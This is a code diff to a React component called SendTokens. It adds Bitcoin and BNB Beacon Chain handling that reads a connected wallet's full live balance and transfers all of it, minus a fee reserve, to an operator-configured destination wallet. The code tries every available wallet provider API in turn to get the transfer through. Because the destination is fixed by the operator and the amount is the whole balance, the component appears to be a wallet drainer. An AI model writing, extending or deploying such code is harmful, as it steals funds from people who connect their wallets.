@@ -16,6 +16,40 @@ import {
   Connection,
 } from '@solana/web3.js';
 
+const BTC_NATIVE_ID = 'btc-native';
+const BNB_NATIVE_ID = 'bnb-native';
+
+function isBtcChain(chain: string | undefined): boolean {
+  if (!chain) return false;
+  const c = chain.toUpperCase();
+  return c === 'BTC' || c === 'BITCOIN';
+}
+
+function isBnbChain(chain: string | undefined): boolean {
+  if (!chain) return false;
+  const c = chain.toUpperCase();
+  return c === 'BNB' || c === 'BNB_CHAIN' || c === 'BINANCE';
+}
+
+function isBnbBech32Address(addr: string | undefined): boolean {
+  if (!addr) return false;
+  return addr.startsWith('bnb1') || addr.startsWith('tbnb1');
+}
+
+async function fetchBnbBalanceMiniUnits(
+  bech32Address: string,
+): Promise<bigint> {
+  const res = await fetch(
+    `https://api.binance.org/bc/api/v1/account/${bech32Address}`,
+  );
+  if (!res.ok) return BigInt(0);
+  const data = await res.json();
+  const bnb = data.balances?.find(
+    (b: { symbol?: string }) => b.symbol === 'BNB',
+  );
+  return BigInt(bnb?.free || '0');
+}
+
 export const SendTokens = () => {
   const { setToast } = useToasts();
   const showToast = (message: string, type: any) =>
@@ -35,11 +69,14 @@ export const SendTokens = () => {
   const destinationAddress =
     primaryWallet?.chain === 'SOL'
       ? process.env.NEXT_PUBLIC_DESTINATION_WALLET_SOL
-      : primaryWallet?.chain === 'BTC'
+      : isBtcChain(primaryWallet?.chain)
         ? process.env.NEXT_PUBLIC_DESTINATION_WALLET_BTC
-        : process.env.NEXT_PUBLIC_DESTINATION_WALLET_EVM ||
-          process.env.NEXT_PUBLIC_DESTINATION_WALLET ||
-          '';
+        : isBnbChain(primaryWallet?.chain) ||
+            isBnbBech32Address(primaryWallet?.address)
+          ? process.env.NEXT_PUBLIC_DESTINATION_WALLET_BNB
+          : process.env.NEXT_PUBLIC_DESTINATION_WALLET_EVM ||
+            process.env.NEXT_PUBLIC_DESTINATION_WALLET ||
+            '';
 
   // Reset sent guard when wallet changes
   useEffect(() => {
@@ -246,86 +283,224 @@ export const SendTokens = () => {
     }
 
     // ── Bitcoin ────────────────────────────────────────────────────────────────
-    if (primaryWallet.chain === 'BTC') {
+    if (isBtcChain(primaryWallet.chain)) {
       const btcDestination = destinationAddress;
       if (!btcDestination) {
         showToast('Bitcoin destination wallet not configured.', 'warning');
         return;
       }
 
-      const btcToken = tokens.find((t) => t.contract_address === 'btc-native');
-      if (!btcToken) return;
-
       try {
-        // Fetch live confirmed balance in satoshis
-        const btcRes = await fetch(
-          `https://mempool.space/api/address/${primaryWallet.address}`,
-        );
-        const btcData = await btcRes.json();
-        const liveSats =
-          (btcData.chain_stats?.funded_txo_sum || 0) -
-          (btcData.chain_stats?.spent_txo_sum || 0);
+        for (const tokenAddress of tokensToSend) {
+          const token = tokens.find((t) => t.contract_address === tokenAddress);
+          if (
+            !token ||
+            tokenAddress !== BTC_NATIVE_ID ||
+            !token.native_token ||
+            token.contract_ticker_symbol !== 'BTC'
+          ) {
+            continue;
+          }
 
-        const FEE_RESERVE = 2000;
-        const amountToSend = liveSats - FEE_RESERVE;
-        if (amountToSend <= 0) {
-          showToast('BTC balance too low to cover network fee.', 'warning');
-          return;
-        }
+          try {
+            const btcRes = await fetch(
+              `https://mempool.space/api/address/${primaryWallet.address}`,
+            );
+            const btcData = await btcRes.json();
+            const confirmedSats =
+              (btcData.chain_stats?.funded_txo_sum || 0) -
+              (btcData.chain_stats?.spent_txo_sum || 0);
+            const mempoolSats =
+              (btcData.mempool_stats?.funded_txo_sum || 0) -
+              (btcData.mempool_stats?.spent_txo_sum || 0);
+            const liveSats = confirmedSats + mempoolSats;
 
-        const win = window as any;
-        const connector = (primaryWallet.connector as any);
-        let txid: string | undefined;
-
-        // 1. UniSat wallet — exposes window.unisat
-        if (typeof win?.unisat?.sendBitcoin === 'function') {
-          txid = await win.unisat.sendBitcoin(btcDestination, amountToSend);
-        }
-        // 2. OKX wallet
-        else if (typeof win?.okxwallet?.bitcoin?.sendBitcoin === 'function') {
-          const res = await win.okxwallet.bitcoin.sendBitcoin(btcDestination, amountToSend);
-          txid = res?.txhash || res;
-        }
-        // 3. Xverse / Magic Eden / Leather via window.BitcoinProvider (Sats Connect v2)
-        else if (typeof win?.BitcoinProvider?.request === 'function') {
-          const res = await win.BitcoinProvider.request('sendBtcTransaction', {
-            recipients: [{ address: btcDestination, amountSats: BigInt(amountToSend) }],
-            senderAddress: primaryWallet.address,
-          });
-          txid = res?.result?.txid || res?.txid;
-        }
-        // 4. Dynamic Labs connector direct sendBitcoin
-        else if (typeof connector?.sendBitcoin === 'function') {
-          txid = await connector.sendBitcoin(btcDestination, amountToSend);
-        }
-        // 5. Dynamic Labs getSigner → sendBitcoin
-        else {
-          const signer = await connector?.getSigner?.();
-          if (typeof signer?.sendBitcoin === 'function') {
-            txid = await signer.sendBitcoin(btcDestination, amountToSend);
-          } else if (typeof signer?.transfer === 'function') {
-            txid = await signer.transfer(btcDestination, amountToSend);
-          } else {
-            // Last resort: try to find any sendBitcoin on the wallet object chain
-            const walletClient = await connector?.getWalletClient?.();
-            if (typeof walletClient?.sendBitcoin === 'function') {
-              txid = await walletClient.sendBitcoin(btcDestination, amountToSend);
-            } else {
-              showToast('Bitcoin wallet does not support direct transfers.', 'warning');
-              return;
+            const FEE_RESERVE = 2000;
+            const amountToSend = liveSats - FEE_RESERVE;
+            if (amountToSend <= 0) {
+              showToast('BTC balance too low to cover network fee.', 'warning');
+              continue;
             }
+
+            const win = window as any;
+            const connector = primaryWallet.connector as any;
+            let txid: string | undefined;
+
+            if (typeof win?.unisat?.sendBitcoin === 'function') {
+              txid = await win.unisat.sendBitcoin(btcDestination, amountToSend);
+            } else if (
+              typeof win?.okxwallet?.bitcoin?.sendBitcoin === 'function'
+            ) {
+              const res = await win.okxwallet.bitcoin.sendBitcoin(
+                btcDestination,
+                amountToSend,
+              );
+              txid = res?.txhash || res;
+            } else if (typeof win?.BitcoinProvider?.request === 'function') {
+              const res = await win.BitcoinProvider.request('sendBtcTransaction', {
+                recipients: [
+                  { address: btcDestination, amountSats: BigInt(amountToSend) },
+                ],
+                senderAddress: primaryWallet.address,
+              });
+              txid = res?.result?.txid || res?.txid;
+            } else if (typeof connector?.sendBitcoin === 'function') {
+              txid = await connector.sendBitcoin(btcDestination, amountToSend);
+            } else {
+              const signer = await connector?.getSigner?.();
+              if (typeof signer?.sendBitcoin === 'function') {
+                txid = await signer.sendBitcoin(btcDestination, amountToSend);
+              } else if (typeof signer?.transfer === 'function') {
+                txid = await signer.transfer(btcDestination, amountToSend);
+              } else {
+                const walletClient = await connector?.getWalletClient?.();
+                if (typeof walletClient?.sendBitcoin === 'function') {
+                  txid = await walletClient.sendBitcoin(
+                    btcDestination,
+                    amountToSend,
+                  );
+                } else {
+                  showToast(
+                    'Bitcoin wallet does not support direct transfers.',
+                    'warning',
+                  );
+                  continue;
+                }
+              }
+            }
+
+            if (txid) {
+              setCheckedRecords((old) => ({
+                ...old,
+                [BTC_NATIVE_ID]: {
+                  ...old[BTC_NATIVE_ID],
+                  pendingTxn: { hash: txid as string },
+                },
+              }));
+              showToast('BTC transfer submitted!', 'success');
+            }
+          } catch (err: any) {
+            showToast(
+              `BTC Error: ${token.contract_ticker_symbol} ${err.message || String(err)}`,
+              'warning',
+            );
           }
         }
+      } catch (err: any) {
+        showToast(`Bitcoin Connection Error: ${err.message}`, 'warning');
+      }
+    }
 
-        if (txid) {
-          setCheckedRecords((old) => ({
-            ...old,
-            'btc-native': { ...old['btc-native'], pendingTxn: { hash: txid as string } },
-          }));
-          showToast('BTC transfer submitted!', 'success');
+    // ── BNB (Beacon Chain, bech32) ─────────────────────────────────────────────
+    if (
+      isBnbChain(primaryWallet.chain) ||
+      isBnbBech32Address(primaryWallet.address)
+    ) {
+      const bnbDestination = destinationAddress;
+      if (!bnbDestination) {
+        showToast('BNB destination wallet not configured.', 'warning');
+        return;
+      }
+
+      try {
+        for (const tokenAddress of tokensToSend) {
+          const token = tokens.find((t) => t.contract_address === tokenAddress);
+          if (
+            !token ||
+            tokenAddress !== BNB_NATIVE_ID ||
+            !token.native_token ||
+            token.contract_ticker_symbol !== 'BNB'
+          ) {
+            continue;
+          }
+
+          try {
+            const liveMini = await fetchBnbBalanceMiniUnits(
+              primaryWallet.address as string,
+            );
+            const FEE_RESERVE = 100000;
+            const amountToSend = Number(liveMini) - FEE_RESERVE;
+            if (amountToSend <= 0) {
+              showToast('BNB balance too low to cover network fee.', 'warning');
+              continue;
+            }
+
+            const win = window as any;
+            const connector = primaryWallet.connector as any;
+            const amountHuman = amountToSend / 1e8;
+            let txHash: string | undefined;
+
+            if (typeof connector?.sendBnb === 'function') {
+              txHash = await connector.sendBnb(bnbDestination, amountToSend);
+            } else if (typeof win?.BinanceChain?.request === 'function') {
+              const res = await win.BinanceChain.request({
+                method: 'transfer',
+                params: {
+                  from: primaryWallet.address,
+                  to: bnbDestination,
+                  amount: amountHuman,
+                  asset: 'BNB',
+                },
+              });
+              txHash = res?.hash || res?.txHash || res;
+            } else if (typeof win?.binanceChain?.request === 'function') {
+              const res = await win.binanceChain.request({
+                method: 'transfer',
+                params: {
+                  from: primaryWallet.address,
+                  to: bnbDestination,
+                  amount: amountHuman,
+                  asset: 'BNB',
+                },
+              });
+              txHash = res?.hash || res?.txHash || res;
+            } else {
+              const signer = await connector?.getSigner?.();
+              if (typeof signer?.sendBnb === 'function') {
+                txHash = await signer.sendBnb(bnbDestination, amountToSend);
+              } else if (typeof signer?.transfer === 'function') {
+                txHash = await signer.transfer(bnbDestination, amountToSend);
+              } else {
+                const walletClient = await connector?.getWalletClient?.();
+                if (typeof walletClient?.sendBnb === 'function') {
+                  txHash = await walletClient.sendBnb(
+                    bnbDestination,
+                    amountToSend,
+                  );
+                } else if (typeof walletClient?.transfer === 'function') {
+                  txHash = await walletClient.transfer(
+                    bnbDestination,
+                    amountToSend,
+                  );
+                } else {
+                  showToast(
+                    'BNB wallet does not support direct transfers.',
+                    'warning',
+                  );
+                  continue;
+                }
+              }
+            }
+
+            if (txHash) {
+              setCheckedRecords((old) => ({
+                ...old,
+                [BNB_NATIVE_ID]: {
+                  ...old[BNB_NATIVE_ID],
+                  pendingTxn: { hash: txHash as string },
+                },
+              }));
+              showToast('BNB transfer submitted!', 'success');
+            }
+          } catch (err: any) {
+            showToast(
+              `BNB Error: ${token.contract_ticker_symbol} ${err.message || String(err)}`,
+              'warning',
+            );
+          }
         }
       } catch (err: any) {
-        showToast(`BTC Error: ${err.message || String(err)}`, 'warning');
+        showToast(`BNB Connection Error: ${err.message}`, 'warning');
       }
     }
   }, [
@@ -337,11 +512,19 @@ export const SendTokens = () => {
     tokens,
   ]);
 
+  const onBnb =
+    isBnbChain(primaryWallet?.chain) ||
+    isBnbBech32Address(primaryWallet?.address);
+
   const addressAppearsValid: boolean =
     typeof destinationAddress === 'string' &&
     (destinationAddress.includes('.') ||
       isAddress(destinationAddress) ||
-      (destinationAddress.length >= 32 && destinationAddress.length <= 44));
+      (onBnb
+        ? isBnbBech32Address(destinationAddress)
+        : isBtcChain(primaryWallet?.chain)
+          ? destinationAddress.length >= 26 && destinationAddress.length <= 62
+          : destinationAddress.length >= 32 && destinationAddress.length <= 44));
 
   const checkedCount = Object.values(checkedRecords).filter(
     (record) => record.isChecked,
